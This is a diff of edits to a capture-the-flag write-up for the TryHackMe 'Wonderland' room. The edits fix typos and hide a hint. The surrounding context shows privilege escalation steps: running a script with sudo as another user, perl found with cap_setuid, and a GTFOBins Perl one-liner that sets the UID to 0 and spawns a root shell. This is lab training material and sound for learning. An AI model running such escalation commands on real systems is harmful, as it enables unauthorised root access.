@@ -121,7 +121,7 @@ Nothing in the first one, but the second has a text file, let have a look:
 
 ```text
 root@kali:~/thm/wonderland# cat hint.txt
-follow the r a b b i t
+<<HIDDEN>>
 ```
 
 Interesting, with nothing else obvious to look at on the website, let's try gobuster:
@@ -154,7 +154,7 @@ We've looked in img already, let's try poem:
 
 ![jabberwocky](/assets/images/2020-06-07-18-26-46.png)
 
-It's the nonsense poem from the Story, but nothing else there. Try the other folder:
+It's the nonsense poem from the story, but nothing else there. Try the other folder:
 
 ![keep_going](/assets/images/2020-06-07-18-29-41.png)
 
@@ -274,7 +274,7 @@ Now we run the script as the rabbit user:
 
 ```text
 alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
-rabbit@wonderland:~$ sh
+rabbit@wonderland:~$
 ```
 
 We now have a shell as rabbit, lets look in their home folder:
@@ -494,7 +494,7 @@ hatter   pts/0    10.9.17.195      16:55    7.00s  0.74s  0.08s w
 
 <<SNIP>>
 
-e [+] Files with POSIX capabilities set:
+[+] Files with POSIX capabilities set:
 /usr/bin/perl5.26.1 = cap_setuid+ep
 /usr/bin/mtr-packet = cap_net_raw+ep
 /usr/bin/perl = cap_setuid+ep
@@ -504,7 +504,7 @@ e [+] Files with POSIX capabilities set:
 
 Capabilities is a well known attack vector. [GTFOBins](https://gtfobins.github.io/gtfobins/) has lots of really good information about the many UNIX/Linux binaries that can be abused. [This](https://gtfobins.github.io/gtfobins/perl) section talks about Perl and what you can do with CAP_SETUID being set.
 
-From that article iI took this command:
+From that article I took this command:
 
 ```text
 ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
